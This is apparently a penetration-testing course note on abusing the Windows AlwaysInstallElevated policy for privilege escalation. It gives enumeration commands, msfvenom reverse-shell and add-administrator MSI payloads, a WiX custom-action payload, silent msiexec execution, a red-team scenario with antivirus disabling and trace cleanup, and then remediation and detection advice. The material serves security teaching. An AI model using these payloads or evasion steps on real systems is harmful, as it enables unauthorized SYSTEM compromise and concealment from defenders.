---
tags: [active-directory, intermediate, privesc, vapt]
difficulty: intermediate
module: "69 - AD Access Controls and Escalation Basics"
topic: "69.08 AlwaysInstallElevated Abuse"
---

# AlwaysInstallElevated Abuse

## 1. Introduction and Executive Summary

In Windows Active Directory environments, system administrators frequently need to deploy software, patches, and updates to standard users who lack the local administrative privileges required to install software themselves. To bypass the restriction on a per-machine or per-user basis, Microsoft provides a Windows Installer policy setting known as `AlwaysInstallElevated`. 

When this policy is enabled, Windows allows any user—regardless of their actual privilege level—to install Microsoft Installer (`.msi`) packages with `NT AUTHORITY\SYSTEM` privileges. While this offers administrative convenience for software deployment, it introduces a critical security vulnerability. If an attacker gains a foothold as a standard user on a system where this policy is active, they can easily craft a malicious `.msi` package containing a reverse shell, backdoor, or command execution payload. When the user executes this installer, the malicious payload runs with full SYSTEM privileges, resulting in immediate and total local privilege escalation (LPE).

## 2. Windows Installer Architecture and the Vulnerability

The Windows Installer service (`msiserver`) handles the installation, maintenance, and removal of software packaged in the `.msi` format. By default, when a standard user runs an MSI, the installer runs in the security context of that user. If the software requires writing to protected directories (like `C:\Program Files`) or the `HKEY_LOCAL_MACHINE` registry hive, the installation will fail unless User Account Control (UAC) prompts for administrative credentials.

The `AlwaysInstallElevated` policy overrides this default behavior. It effectively instructs the `msiserver` to ignore the user's security context and execute all installation actions using the elevated SYSTEM account. 

### 2.1 The Two Registry Keys
For the vulnerability to be exploitable, the `AlwaysInstallElevated` policy must be enabled in **both** the Machine and User registry hives. The policy is controlled by the following two registry values (both must be set to `1`):

1. **Local Machine (HKLM):**
   `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` -> `AlwaysInstallElevated` (REG_DWORD: 1)
2. **Current User (HKCU):**
   `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` -> `AlwaysInstallElevated` (REG_DWORD: 1)

If only one of these keys is set, the exploitation will fail. The requirement for both keys ensures that the system administrator explicitly intended to grant this elevated capability system-wide and to the specific user profile.

## 3. Attack Flow Visualization

Below is an ASCII diagram outlining the exploitation process of the AlwaysInstallElevated misconfiguration:

```text
+--------------------------------------------------------------------------+
|  Active Directory / Local Machine Environment                            |
|                                                                          |
|  Group Policy Object (GPO) pushes AlwaysInstallElevated = 1 to endpoints |
+--------------------------------------------------------------------------+
                                    |
                                    v
+--------------------------------------------------------------------------+
|  Low-Privileged Attacker (Standard User) gains initial access            |
|  (e.g., via Phishing, Web Shell, or lateral movement)                    |
+--------------------------------------------------------------------------+
                                    |
                                    v
+--------------------------------------------------------------------------+
|  1. Enumerate Registry Keys:                                             |
|     Check HKLM\... \AlwaysInstallElevated == 1                           |
|     Check HKCU\... \AlwaysInstallElevated == 1                           |
+--------------------------------------------------------------------------+
                                    |
             (If both are 1, the system is vulnerable)
                                    |
                                    v
+--------------------------------------------------------------------------+
|  2. Weaponization:                                                       |
|     Attacker generates a malicious .msi file on their local attack box   |
|     (e.g., msfvenom -p windows/x64/shell_reverse_tcp ... -f msi)         |
+--------------------------------------------------------------------------+
                                    |
                                    v
+--------------------------------------------------------------------------+
|  3. Execution:                                                           |
|     Attacker transfers 'malicious.msi' to target and runs:               |
|     > msiexec /quiet /qn /i malicious.msi                                |
+--------------------------------------------------------------------------+
                                    |
                                    v
+--------------------------------------------------------------------------+
|  Windows Installer Service (msiserver) sees AlwaysInstallElevated=1      |
|  and spawns the installation custom action as NT AUTHORITY\SYSTEM        |
+--------------------------------------------------------------------------+
                                    |
                                    v
+--------------------------------------------------------------------------+
|  SYSTEM Shell spawned, Local Privilege Escalation successful!            |
+--------------------------------------------------------------------------+
```

## 4. Enumeration Techniques

Detecting this misconfiguration is a standard check during any internal penetration test.

### 4.1 Manual Registry Query (Command Line)
The fastest way to verify the vulnerability is by querying the registry directly using standard Windows utilities.

```cmd
:: Check Local Machine Policy
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Check Current User Policy
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If the output for both commands shows `REG_DWORD    0x1`, the machine is exploitable. If the key does not exist or is set to `0`, the machine is not vulnerable.

### 4.2 PowerShell
You can accomplish the same check via PowerShell:

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue | Select-Object AlwaysInstallElevated

Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue | Select-Object AlwaysInstallElevated
```

### 4.3 Automated Tools
Privilege escalation enumeration scripts check for this by default.

**PowerUp:**
```powershell
Invoke-AllChecks
# Or specific module:
Get-RegistryAlwaysInstallElevated
```

**WinPEAS:**
```cmd
winpeas.exe quiet systeminfo
```

## 5. Weaponization and Exploitation

Once the vulnerability is confirmed, the next step is creating an MSI package that executes our desired payload.

### 5.1 Generating the Malicious MSI with MSFVenom
The Metasploit Framework's payload generator (`msfvenom`) has a built-in format for creating malicious MSI files. By default, it embeds the payload as a custom action that runs during the installation sequence.

To generate a reverse shell payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o reverse_shell.msi
```

To generate a payload that creates a new local administrator (useful if a reverse shell is caught by a firewall):
```bash
msfvenom -p windows/x64/exec CMD="net localgroup administrators attacker /add" -f msi -o add_user.msi
```

### 5.2 Generating an MSI using WiX Toolset
If `msfvenom` payloads are flagged by antivirus, attackers can create custom MSI installers using the Windows Installer XML (WiX) Toolset. This allows for creating entirely benign-looking MSI files that simply execute a batch script or a command string via the `<CustomAction>` tag.

Example WiX source code snippet:
```xml
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-123456789012" Name="LegitApp" Version="1.0.0" Manufacturer="Legit" Language="1033">
    <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
    <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
    
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLDIR" Name="LegitApp"/>
      </Directory>
    </Directory>
    
    <Feature Id="ProductFeature" Title="LegitApp" Level="1"/>
    
    <!-- Custom Action to Execute Command -->
    <CustomAction Id="ExecPayload" Execute="deferred" Impersonate="no" Return="check" Directory="TARGETDIR" ExeCommand="cmd.exe /c net localgroup administrators attacker /add" />
    
    <InstallExecuteSequence>
      <Custom Action="ExecPayload" After="InstallInitialize"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
```
Compiling with WiX:
```cmd
candle.exe payload.wxs
light.exe payload.wixobj
```

### 5.3 Executing the MSI
Transfer the generated `.msi` file to the target machine and execute it. Using the `/quiet` and `/qn` flags hides the installation GUI from the user, and `/i` specifies installation.

```cmd
msiexec /quiet /qn /i C:\Temp\reverse_shell.msi
```

Once executed, the `msiserver` will run the embedded custom action as `NT AUTHORITY\SYSTEM`, spawning the reverse shell or executing the command.

## 6. Post-Exploitation and Considerations

Because the `.msi` file we generated does not contain real software or a proper uninstallation routine, it might leave an orphaned entry in the "Add/Remove Programs" control panel or register a failed installation state. Furthermore, a reverse shell payload might hang the MSI execution engine until the shell is exited.

It is recommended to clear the system of the malicious MSI footprint by attempting an uninstallation or cleaning the registry strings related to the fake application ID, to avoid tipping off administrators or subsequent security audits.

## 7. Remediation and Mitigation

The fix for this vulnerability is strictly administrative and centers around Group Policy management.

1. **Disable the Policy:** The `AlwaysInstallElevated` setting should never be used in a production environment. To remediate, Group Policy Administrators must ensure the policy is explicitly set to **Disabled** or **Not Configured**.
   - Navigate to: `Computer Configuration \ Administrative Templates \ Windows Components \ Windows Installer` -> `Always install with elevated privileges` (Set to Disabled).
   - Navigate to: `User Configuration \ Administrative Templates \ Windows Components \ Windows Installer` -> `Always install with elevated privileges` (Set to Disabled).

2. **Alternative Deployment Mechanisms:** Instead of relying on this insecure policy, administrators should deploy software using centralized endpoint management solutions (e.g., Microsoft SCCM, Intune, PDQ Deploy). These systems run deployment agents as SYSTEM and do not require user interaction or broad system policy changes.

## 8. Detection Mechanisms

Detecting the abuse of `AlwaysInstallElevated` can be achieved by monitoring specific system events and command-line executions.

- **Process Creation Monitoring (Sysmon Event ID 1 / Event ID 4688):** Monitor for `msiexec.exe` being launched with silent flags (`/quiet`, `/q`, `/qn`) from unexpected directories like `C:\Users\*\AppData\Local\Temp\` or `C:\ProgramData\`.
- **Unexpected Parent/Child Processes:** Alert when `msiexec.exe` spawns suspicious child processes such as `cmd.exe`, `powershell.exe`, `net.exe`, or known reverse shell binaries. A legitimate installer rarely spawns raw command shells.
- **Application Event Log (Event ID 11724 / 1040 / 1042):** Monitor the Application log for Windows Installer events originating from standard users.
- **Registry Monitoring:** Audit the creation or modification of the `AlwaysInstallElevated` registry keys to prevent unauthorized enablement of the policy.

## Real-World Attack Scenario

During a Red Team engagement for a logistics company, the operator compromised a receptionist's workstation (`WS-RECP-01`). The standard user account (`s.smith`) was heavily restricted. 

While running basic enumeration checks, the operator queried the registry for the `AlwaysInstallElevated` keys:
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

Both queries returned `0x1`. The IT department had enabled this policy via a poorly scoped GPO to push out a legacy printer driver update years ago and never disabled it.

**The Execution:**
1. Recognizing the severe misconfiguration, the operator moved to weaponize the finding. They spun up a Kali Linux VM and used `msfvenom` to generate a malicious MSI package:
   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o update_driver.msi`
2. The operator downloaded `update_driver.msi` to the `C:\Users\s.smith\AppData\Local\Temp\` directory on the victim machine to avoid antivirus detection in common folders.
3. They set up a Netcat listener on their attack infrastructure.
4. From the standard user command prompt, they executed the MSI package silently:
   `msiexec /quiet /qn /i C:\Users\s.smith\AppData\Local\Temp\update_driver.msi`

**The Outcome:**
The Windows Installer service (`msiserver`) initiated the installation. Because `AlwaysInstallElevated` was active, the service ignored the low-privileged context of `s.smith` and ran the embedded custom action (the reverse shell) as `NT AUTHORITY\SYSTEM`. The operator received a high-integrity shell on their listener within seconds. They immediately utilized the SYSTEM access to disable local endpoint protections and establish a persistent Cobalt Strike beacon before cleaning up the fake MSI installation records.

## 9. Chaining Opportunities

- **Bypassing UAC:** Even if a user is in the local Administrators group, they run in a medium integrity context due to UAC. If `AlwaysInstallElevated` is active, they can bypass the UAC prompt entirely by running an MSI payload, granting them an immediate high-integrity SYSTEM shell.
- **Initial Access Payload Delivery:** If an attacker sends a macro-enabled Word document via spear-phishing that writes an MSI to disk and executes it, the initial access phase immediately transitions to full system compromise without needing an intermediate local privilege escalation step.
- **Active Directory Exploitation:** Once SYSTEM is acquired on an endpoint, attackers can extract LAPS passwords, dump LSASS memory to harvest Domain Admin credentials, or perform token impersonation to move laterally across the network.

## 10. Related Notes
- [[06 - Exploiting Weak Service Permissions]]
- [[07 - Unquoted Service Paths in AD Environments]]
- [[09 - Exploiting Weak Registry Permissions]]
- [[01 - Local Privilege Escalation Fundamentals]]
- [[05 - Bypassing User Account Control (UAC)]]

The `AlwaysInstallElevated` misconfiguration is a prime example of how convenience features designed for legacy network administration can introduce critical security flaws when modern threat modeling is not applied.
